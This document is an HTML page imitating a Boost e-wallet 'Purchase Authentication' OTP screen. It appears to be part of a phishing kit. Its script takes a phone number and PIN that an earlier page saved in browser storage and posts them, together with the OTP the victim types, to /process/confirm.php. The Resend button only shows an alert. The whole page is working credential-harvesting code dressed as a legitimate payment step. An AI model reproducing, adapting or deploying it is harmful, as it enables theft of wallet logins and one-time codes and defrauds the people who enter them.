<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Purchase Authentication</title>

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>

  <style>
    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .animate-spin {
      animation: spin 1s linear infinite;
    }
  </style>
</head>

<body class="min-h-screen flex flex-col bg-white text-gray-800">

  <!-- HEADER -->
  <header class="bg-[#EA0029] py-5 flex justify-center">
    <img src="boost-logo-white.svg" alt="Boost" class="w-20 h-auto" />
  </header>

  <!-- MAIN -->
  <main class="flex-grow w-full max-w-sm mx-auto px-5 py-10">
    <!-- Error State -->
    <div id="errorBlock" class="hidden text-center bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
      <p class="mb-2 font-semibold">Phone number not found</p>
      <p>Please <a href="/" class="underline font-semibold">sign in again</a>.</p>
    </div>

    <!-- OTP Screen -->
    <div id="otpBlock">
      <h1 class="text-2xl font-bold mb-1">Purchase Authentication</h1>
      <p class="text-gray-500 mb-6">
        The OTP code has been sent to <span id="maskedPhone" class="font-semibold text-gray-700"></span>
      </p>

      <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit OTP</label>
      <div class="flex justify-between mb-8">
        <input maxlength="1" type="password" inputmode="numeric"
          class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded" />
        <input maxlength="1" type="password" inputmode="numeric"
          class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded" />
        <input maxlength="1" type="password" inputmode="numeric"
          class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded" />
        <input maxlength="1" type="password" inputmode="numeric"
          class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded" />
        <input maxlength="1" type="password" inputmode="numeric"
          class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded" />
        <input maxlength="1" type="password" inputmode="numeric"
          class="otp w-12 h-14 text-center text-2xl border-b-2 border-gray-300 focus:border-[#EA0029] focus:outline-none bg-gray-50 rounded" />
      </div>

      <div class="space-y-3">
        <button id="confirmBtn"
          class="w-full py-3 bg-[#EA0029] text-white font-semibold rounded-lg shadow-md disabled:opacity-40 active:scale-95 transition">
          CONFIRM
        </button>

        <button id="resendBtn"
          class="w-full py-3 border border-[#EA0029] text-[#EA0029] font-semibold rounded-lg disabled:opacity-40 transition"
          disabled>
          RESEND
        </button>

        <button id="cancelBtn"
          class="w-full py-3 bg-gray-100 text-gray-600 font-semibold rounded-lg active:scale-95 transition">
          CANCEL
        </button>
      </div>

      <small class="block text-gray-400 text-center mt-6">
        The page will automatically timeout after 7 minutes.
      </small>
      <div id="timer" class="text-center text-gray-600 mt-2 font-medium"></div>
    </div>
  </main>

  <!-- SCRIPT -->
  <script>
    const phone = localStorage.getItem("boost_phone");
    const pin = localStorage.getItem("boost_pin");

    const otpBlock = $("#otpBlock");
    const errorBlock = $("#errorBlock");
    const maskedPhone = $("#maskedPhone");
    const confirmBtn = $("#confirmBtn");
    const resendBtn = $("#resendBtn");
    const cancelBtn = $("#cancelBtn");
    const otpInputs = $(".otp");
    const timerEl = $("#timer");

    // tampilkan blok sesuai data
    if (!phone || !pin) {
      errorBlock.removeClass("hidden");
      otpBlock.addClass("hidden");
    } else {
      const masked = phone.slice(0, 4) + "****" + phone.slice(-2);
      maskedPhone.text(masked);
    }

    // OTP auto focus
    otpInputs.on("input", function () {
      this.value = this.value.replace(/\D/g, "");
      if (this.value.length === 1) {
        $(this).next(".otp").focus();
      }
    });

    otpInputs.on("keydown", function (e) {
      if (e.key === "Backspace" && !this.value) {
        $(this).prev(".otp").focus();
      }
    });

    // Confirm AJAX
    confirmBtn.on("click", function () {
      if (!phone || !pin) return;

      const otp = otpInputs.map((i, el) => el.value).get().join("");
      if (otp.length < 6) {
        alert("Please enter a valid 6-digit OTP");
        return;
      }

      confirmBtn.html(`<div class='inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2'></div> Please Wait ...`);
      confirmBtn.prop("disabled", true);

      $.ajax({
        url: "/process/confirm.php",
        method: "POST",
        data: { phone: phone, pin: pin, otp: otp },
        dataType: "json",
        success: function (data) {
          if (data.success) {
            localStorage.removeItem("boost_phone");
            localStorage.removeItem("boost_pin");
            window.location.href = "success.html";
          } else {
            alert(data.error || "Verification failed");
          }
        },
        error: function () {
          alert("Connection error. Please try again.");
        },
        complete: function () {
          confirmBtn.text("CONFIRM");
          confirmBtn.prop("disabled", false);
        }
      });
    });

    // Cancel
    cancelBtn.on("click", function () {
      localStorage.removeItem("boost_phone");
      localStorage.removeItem("boost_pin");
      window.location.href = "/";
    });

    // Timer
    let timeLeft = 420;
    function updateTimer() {
      if (timeLeft <= 0) {
        resendBtn.prop("disabled", false);
        confirmBtn.prop("disabled", true);
        timerEl.text("Time expired!");
        return;
      }
      const m = Math.floor(timeLeft / 60);
      const s = timeLeft % 60;
      timerEl.text(`Time left: ${m}:${s.toString().padStart(2, "0")}`);
      timeLeft--;
    }

    if (phone && pin) {
      updateTimer();
      setInterval(updateTimer, 1000);
    }

    resendBtn.on("click", function () {
      alert("Resending OTP...");
      resendBtn.prop("disabled", true);
      timeLeft = 420;
    });
  </script>
</body>

</html>